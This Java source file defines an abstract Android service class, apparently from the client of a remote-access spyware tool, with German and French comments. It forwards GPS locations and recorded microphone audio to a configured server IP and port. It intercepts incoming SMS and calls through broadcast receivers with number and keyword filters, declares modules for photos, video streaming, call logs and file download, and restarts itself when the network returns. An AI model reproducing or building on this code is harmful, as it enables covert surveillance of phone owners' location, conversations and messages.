package my.app.client;

import java.util.ArrayList;
import java.util.HashSet;

import my.app.Library.*;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.location.LocationListener;
import android.media.AudioRecord;
import android.media.AudioRecord.OnRecordPositionUpdateListener;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;
import inout.Protocol;
import android.view.SurfaceView;

/**
 * Dies ist eine Abtrakte Klasse, welche von der Klasse Service erbt und die Interfaces OnRecordPositionUpdateListener und LocationListener implementiert.
 * Diese Klasse ist dei Grundlage der Klasse Client
 */
public abstract class ClientListener extends Service implements OnRecordPositionUpdateListener, LocationListener {
	/**
	 * Diese Methode ist abstract und wird es in der Klasse Client implementiert
	 * @param channel
	 * @param data
	 */
	public abstract void handleData(int channel, byte[] data); // C'est THE methode à implémenter dans Client

	/**
	 * Diese Methode ist abstrakt und wird erst in der Klase Client implementiert
	 * @param infos
	 */
	public abstract void sendInformation(String infos);

	/**
	 * Abstrakte Methode die in der Klasse Client implementiert wird
	 * @param error
	 */
	public abstract void sendError(String error);

	/**
	 * Abstrakte Methode Die in der Klasse Client implementiert wird
	 */
	public abstract void loadPreferences();

	/**
	 * Variablen der Klassen die im Paket Library implementiert sind. Diese werden später benötigt um die Methoden der Klassen aufzurufen und somit an die Daten des Gerätes zu kommen.
	 */
	public AudioStreamer audioStreamer;
	public CallMonitor callMonitor;
	public CallLogLister callLogLister;
	public DirLister dirLister ;
	public FileDownloader fileDownloader;
	public GPSListener gps;
	public PhotoTaker photoTaker ;
	public SystemInfo infos;
	public Toast toast ;
	public SMSMonitor smsMonitor ;
	public AdvancedSystemInfo advancedInfos;
	public Torch torch;
	public VideoStreamer videoStreamer;
	public SetAlarm setAlarm;
	boolean waitTrigger;
	/**
	 * String Arrays die Nummern oder Schlagwörter beinhalten. Diese werden benötigt um SMS oder Anrufe nach den Wünschen des Benutzers zu filtern
	 */
	ArrayList<String> authorizedNumbersCall;
	ArrayList<String> authorizedNumbersSMS;
	ArrayList<String> authorizedNumbersKeywords;
	/**
	 * Die Ip und der Port an den welchen sich die Anwendung verbinden soll.
	 */
	String ip;
	int port;
	/**
	 * zeigt an ob ein Verbindung besteht.
	 */
	protected boolean isConnected = true;


	/**
	 * Kontruktor der Klasse. Er ruft lediglich den Konstruktor der Oberklasse auf.
	 */
	public ClientListener() {
		super();
	    //IntentFilter filter = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE");
	    //registerReceiver(ConnectivityCheckReceiver, filter); //Il faudrait aussi le unregister quelquepart
	}

	/**
	 * Überprüft ob sie der Standort verändert hat.
	 * @param location neuer Standort
	 */
	public void onLocationChanged(Location location) {
		/**
		 * Der neue Standort wird in einem byte-Array gespeichert und mit dem Aufruf der Funktion handleData an den Server gesendet.
		 * handleData wird in der Klasse Client implementiert
		 */
		byte[] data = gps.encode(location);
		handleData(gps.getChannel(), data);
	}

	/**
	 * Überprüft ob der GPS Sensor deaktiviert ist
	 * @param provider GPS Sensor Provider
	 */
	public void onProviderDisabled(String provider) {
		sendError("GPS desactivated");
	}

	/**
	 * Überpfürt oder der GPS Sensor aktiviert ist.
	 * @param provider GPS Sensor Provider
	 */
	public void onProviderEnabled(String provider) {
		sendInformation("GPS Activated");
	}

	/**
	 * Methode hat keine Funktion. Muss jedoch implementiert werden, da sie im Interface angegeben wurde
	 * @param provider
	 * @param status
	 * @param extras
	 */
	public void onStatusChanged(String provider, int status, Bundle extras) {
		//We really don't care
	}

	/**
	 * Diese Funktion wird aufgerufen wenn die Periode des recorders erreicht wurde.
	 * @param recorder Der Audiorecorder
	 */
	public void onPeriodicNotification(AudioRecord recorder) {
		//Log.i("AudioStreamer", "Audio Data received !");
		/**
		 * Es wird versucht die Daten des AudioStreames in einem Byte-Array zu speichern.
		 * Sollte das Byte-Array im Anschluss nicht leer sein so werden die Daten mit Hilfe der handleData Funktion an den Server geschickt
		 */
		try {
			byte[] data = audioStreamer.getData();
			if(data != null)
				handleData(audioStreamer.getChannel(), data);
		}
		catch(NullPointerException e) {
			
		}
	}

	/**
	 * Hier wird ein Error gesendet sollte der Audiomarker erreicht werden.
	 * @param recorder Der Audiorecorder
	 */
	public void onMarkerReached(AudioRecord recorder) {
		sendError("Marker reached for audio streaming");
	}

	/**
	 * Liefert immer null zurück hat keine Funktion
	 * @param intent Intent
	 * @return null
	 */
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	/**
	 * Neuer BroadcastRceiver SMSreceiver empfängt SMS intents.
	 * Dieser Broadcast ist für der Livemonitoren von SMS zuständig
	 */
	 protected BroadcastReceiver SMSreceiver = new BroadcastReceiver() {
		/**
		 * SMS_RECEIVES enthält den String, der in der Action des Intents stehen muss, damit es sich um eine empfangene SMS handelt.
		 */
		 	private final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
		 
	        @Override
			/**
			 * Wenn ein Intent empfangen wird, wird diese Methode empfangen
			 * @param context Der Kontext
			 * @param intent der Empfangene Intent
			 */
	        public void onReceive(Context context, Intent intent) {
				/**
				 * Überprüft ob die Action mit dem String SMS_Received übereinstimmt.
				 * Sollte dies der Fall sein wird zu Testzwecken wieder in den LOG geschrieben
				 */
			 	if(intent.getAction().equals(SMS_RECEIVED)) { //On vérifie que c'est bien un event de SMS_RECEIVED même si c'est obligatoirement le cas.
			 		Log.i("SMSReceived", "onReceive sms !");
					/**
					 * Die Daten des Intents werden extrahiert und in der Variablen bundle gespeichert.
					 * Sollten diese Bundle Daten enhalten wird es weiterverarbeitet.
					 */
					Bundle bundle = intent.getExtras();
					if (bundle != null) {
						/**
						 * Da SMS eine bestimmte Länge besitzen und wenn diese Überschritten wird mehrere SMS gesendet werden,
						 * wird hier ein Object Array der Länger der Sms erstellt.
						 */
						Object[] pdus = (Object[]) bundle.get("pdus");
						/**
						 * Erstellen eines SmsMesseage Arrays der Länge puds. Zusätzlich werden die SMS in dieses Array geschrieben und dort gespeichert
						 */
						final SmsMessage[] messages = new SmsMessage[pdus.length];
						for (int i = 0; i < pdus.length; i++)  {
							 messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
						}
						/**
						 * Sollte das messageArray eine Größe größer als -1 besitzen so werden der MessageBody und die Nummer aus der SMS extrahiert und in den Variablen messageBody und phoneNumber gespeichert.
						 */
						if (messages.length > -1) {
							
							 final String messageBody = messages[0].getMessageBody();
							 final String phoneNumber = messages[0].getDisplayOriginatingAddress();
							/**
							 * Sollte in dem Arry authorizedNumbersCall Daten gespeichert werden so wird nun überprüft ob die phoneNumber in diesem Array vorkommt.
							 * Ist die nicht der Fall wird returned ansonsten wir found auf true gesetzt. Es ist praktisch ein Filter
							 */
							if(authorizedNumbersCall != null) {
								boolean found = false;
								boolean foundk = false;
								for(String s: authorizedNumbersSMS) {
									if(s.equals(phoneNumber))
										found = true;
								}
								if(!found)
									return;
								/**
								 * Soll zusätzlich nach Schlüsselwörtern gesucht werden so ist das Array authorizedNumbersKeywords nicht leer.
								 * Dann wird der Inhalt der SMS nach diese Schlüsselwörtern durchsucht. Sollten diese gefunden werden so wird die Variable foundk auf true gesetzt.
								 * Ansonsten wird wieder returned
								 */
								if(authorizedNumbersKeywords != null) {
									for(String s: authorizedNumbersKeywords) {
										if(messageBody.contains(s))
											foundk = true;
									}
									if(!foundk)
										return;
								}
								/**
								 * Log-Nachricht zu TestZwecken
								 */
								Log.i("Client","Incoming call authorized");
							}
							/**
							 * Sollten alle überprüfungen erfolgreich sein, so wird an die Klasse Client ein Intent gesendet mit dem Context und der Action SMSReceiver
							 */
							Intent serviceIntent = new Intent(context, Client.class); // On lance le service
							serviceIntent.setAction("SMSReceiver");
							context.startService(serviceIntent);
						}
					}
			 	}
	        }
	 };
	/**
	 * Neuer BroadcastReceiver Callreceiver. Empfängt Intents mit der Action TelephonyManager.ACTION_PHONE_STATE_CHANGED und verarbeitet diese mit Filtern.
	 * Zum Livemonitoren von Anrufen zuständig.
	 */
	 protected BroadcastReceiver Callreceiver = new BroadcastReceiver() {
		 private static final String TAG = "CallReceiver";
		 
		@Override
		/**
		 * WIrd aufgerufen wenn ein Intent empfangen wird.
		 * @param context Der Kontext
		 * @param intent Der empfangene Intent
		 */
		public void onReceive(final Context context, final Intent intent) {
			/**
			 * Logeintrag zu Testzwecken
			 */
			Log.i(TAG, "Call state changed !");
			/**
			 * Die Intentaction wird in dem String Action gespeichert.
			 */
			final String action = intent.getAction();
			/**
			 * Überprüft ob es sich um die gewünschte Intentaction handelt
			 */
			if (action.equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {
				/**
				 * Extrahieren des Status und speichern in phoneState.
				 * Extrahieren des Nummer und speichern in der Variablen PhoneNumber.
				 */
				final String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
				final String phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
				/**
				 * Überprüfen der Variablen phoneState. Sollte diese TelephonyManager.EXTRA_STATE_RINGING sein so handelt es sich um einen eingehenden Anruf.
				 */
				if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
					/**
					 * Logeintrag zu Testzwecken
					 */
					Log.i(TAG,"Incoming call");
					/**
					 * Überprüft ob die phoneNumber un dem Array authorizedNumbersCall vorhanden ist, sofern das Array Daten enthält.
					 * Sollte die Nummer vorhanden sein so wird die Variable found auf true gesetzt. Auch hier handelt es sich um einen Filter
					 */
					if(authorizedNumbersCall != null) {
						boolean found = false;
						for(String s: authorizedNumbersCall) {
							if(s.equals(phoneNumber))
								found = true;
						}
						/**
						 * Sollte dies nicht der Fall sein so wird return aufgerufen.
						 */
						if(!found)
							return;
						Log.i(TAG,"Incoming call authorized");
					}
					/**
					 * Wenn alle Überprüfungen erfolgreich waren wird ein Intent an die Klasse Client gesendet, Dieser enhält den Kontext und die Action wird auf CallReceiver gesetzt.
					 */
					Intent serviceIntent = new Intent(context, Client.class); // On lance le service
					serviceIntent.setAction("CallReceiver");
					context.startService(serviceIntent);
				}
				
			} else {// Default event code

				final String data = intent.getDataString();
				Log.i(TAG, "broadcast : action=" + action + ", data=" + data);

			}
		}

	 };

	/**
	 * Neuer BroadcastReceiver ConnectivityCheckReceiver. Überprüft ob das Gerät über mobile Daten oder Wlan Zugang zu einem Netzwerk hat.
	 */
	public final BroadcastReceiver ConnectivityCheckReceiver = new BroadcastReceiver() {
		
		private String TAG = "ConnectivityReceiver";
		
	    @Override
		/**
		 * Wird Aufgerufen wenn der Intent empfangen wird.
		 * @param context Kontext
		 * @param intent Der empfangene Intent
		 */
	    public void onReceive(Context context, Intent intent) {
			/**
			 * Extrahieren der intent-Action. Diese wird dann in dem String action gespeichert.
			 */
	        String action = intent.getAction();
	        String type;
	        boolean state;
	        //isConnected = intent.getBooleanExtra(ConnectivityManager.EXTRA_NO_CONNECTIVITY, false);
			/**
			 * Neuer ConectivityManager erstellen und aus diesem die ActivNetworkInfo extrahiernen. Diese wird dann in dem Varibalen TestCo gepsieichert.
			 */
	        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
	        NetworkInfo TestCo = connectivityManager.getActiveNetworkInfo();
			/**
			 * Sollte TestCo null sein wird die Variable state auf false gesetzt.
			 * Sonst auf true.
			 */
	        if(TestCo == null)
	        	state = false;
	        else
	        	state = true;
			/**
			 * Extrahiert zusätzliche Netzwerk Informationen aus dem Intent und speicher diese in der Variablen networkInfo
			 */
	        NetworkInfo networkInfo = (NetworkInfo) intent.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);
			/**
			 * Überprüft ob der Type der Varibalen networkInfo TYPE_WIFI oder TYPE_MOBILE ist.
			 * Jenachdem wird die Vaiable type auf Wifi, 3g oder other gesetzt.
			 */
			if(networkInfo.getType() == ConnectivityManager.TYPE_WIFI)
	        	type = "Wifi";
	        else if(networkInfo.getType() == ConnectivityManager.TYPE_MOBILE)
	        	type = "3g";
	        else
	        	type = "other";
			/**
			 * Sollte die Vaiable state ture sein so wird ein Intent an die Klasse Client gesendet und diesem der Context übergeben und die Action auf ConnectivityCheckReceiver gesetzt.
			 * Ansonsten wird ein Logeintrag erstellt, dass keine Verbindung vorhanden ist. Zum Schluss wird die Varibale isConnected noch auf den Inhalt der Varibalen state gesetzt.
			 */
	        if(state){
	        	Log.w(TAG, "Connection is Available "+type);
	        	if(!isConnected) { //Si la connection est maintenant ok et qu'on était déconnecté
					Intent serviceIntent = new Intent(context, Client.class); // On lance le service
					serviceIntent.setAction("ConnectivityCheckReceiver");
					context.startService(serviceIntent);
	        	}
		    }
		    else {
		    	Log.w(TAG, "Connection is not Available "+type);
		    }
	        isConnected = state;
	    }
	};
}
